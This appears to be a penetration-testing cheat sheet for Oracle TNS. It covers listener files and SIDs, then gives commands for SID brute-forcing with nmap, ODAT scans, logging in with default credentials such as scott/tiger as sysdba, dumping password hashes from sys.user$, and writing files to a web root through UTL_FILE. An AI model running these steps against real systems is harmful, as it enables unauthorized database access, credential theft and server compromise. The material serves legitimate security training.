# Oracle TNS

Use this page to enumerate Oracle database services, validate access, and identify risky settings.

### Key notes

* **What it is:** A proprietary client-server architecture for Oracle database instances.
* **Key port:** TCP `1521`
* **Key files:** `tnsnames.ora` and `listener.ora`
* **Critical identifier:** SID

### Core architecture and files

Oracle splits connection and resolution tasks across a few core files and listener components:

* `tnsnames.ora` — a client-side file that maps database service names to network addresses, ports, and protocols.
* `listener.ora` — a server-side file that defines how the listener receives connections and routes them to the correct database instance.
* Default directory — `$ORACLE_HOME/network/admin` or `C:\oracle\product\19.0.0\dbhome_1\network\admin`

### Key configuration parameters

| **Parameter**   | **Function**                                                                                |
| --------------- | ------------------------------------------------------------------------------------------- |
| `DESCRIPTION`   | Provides a name for the database and its connection type.                                   |
| `ADDRESS`       | Defines the network address, including hostname and port.                                   |
| `PROTOCOL`      | Defines the communication protocol, such as TCP, UDP, or IPC.                               |
| `PORT`          | Defines the port used for communication. The default is `1521`.                             |
| `CONNECT_DATA`  | Defines connection attributes such as service name, SID, protocol, and instance identifier. |
| `INSTANCE_NAME` | Defines the specific database instance the client wants to reach.                           |
| `SERVICE_NAME`  | Defines the service the client wants to connect to.                                         |
| `SERVER`        | Defines the server type, such as dedicated or shared.                                       |

### The key term: SID

* **SID (System Identifier):** A unique, case-sensitive identifier for a specific Oracle database instance.
* **Why it matters:** If you provide the wrong SID, the listener rejects the connection before password guessing even matters.

{% hint style="info" %}
Common default SIDs include `XE`, `ORCL`, `PROD`, and `TEST`.
{% endhint %}

### Known default credentials

* Oracle 9 default password — `CHANGE_ON_INSTALL`
* Oracle DBSNMP service default — `dbsnmp / dbsnmp`
* Common lab default profile — `scott / tiger`

### Service footprinting and verification

#### Check port status (`nmap`)

Identify whether an active listener is exposed:

{% code title="Check Oracle listener port" %}
```bash
sudo nmap -p 1521 -sV <TARGET_IP> --open
```
{% endcode %}

#### Brute-force the SID (`nmap`)

If you do not know the SID, run the Oracle SID brute-force script:

{% code title="Oracle SID brute-force" %}
```bash
sudo nmap -p 1521 -sV <TARGET_IP> --open --script oracle-sid-brute
```
{% endcode %}

#### Run broad enumeration with ODAT

ODAT automates Oracle identification checks, credential testing, and exploitation paths:

{% code title="ODAT full scan" %}
```bash
./odat.py all -s <TARGET_IP>
```
{% endcode %}

{% hint style="info" %}
ODAT often reveals legacy default credentials such as `scott:tiger` or `dbsnmp:dbsnmp`.
{% endhint %}

#### Connect with `sqlplus`

Once you identify a valid SID and working credentials, connect with `sqlplus`:

{% code title="Connect with SQL*Plus" %}
```bash
# Standard Session
sqlplus scott/tiger@<TARGET_IP>/XE

# Administrative Session
sqlplus scott/tiger@<TARGET_IP>/XE as sysdba
```
{% endcode %}

### Active session database navigation (SQL\*Plus)

Once your prompt changes to `SQL>`, use these queries to inspect the environment:

{% code title="Oracle enumeration queries" %}
```sql
/* 1. Environment & Privilege Verification */
select * from user_role_privs;        -- Displays your active execution and system group tokens

/* 2. Listing Structural Content Tables */
select table_name from all_tables;    -- Compiles a listing of every database table viewable to you

/* 3. Looting Master Passwords (Requires SYSDBA Role) */
select name, password from sys.user$; -- Dumps all database profile handles and their DES/SHA hashes
```
{% endcode %}

### Post-enumeration priorities

#### Remote file upload execution (`ODAT`)

If your current context has `SYSDBA` rights or access to packages such as `UTL_FILE`, you may be able to write files to the underlying operating system:

{% code title="Upload a file with ODAT" %}
```bash
./odat.py utlfile -s <TARGET_IP> -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```
{% endcode %}

Common target web roots:

* Linux — `/var/www/html/`
* Windows — `C:\inetpub\wwwroot\`

Verify the upload from your terminal:

{% code title="Verify uploaded file" %}
```bash
curl -X GET http://<TARGET_IP>/testing.txt
```
{% endcode %}
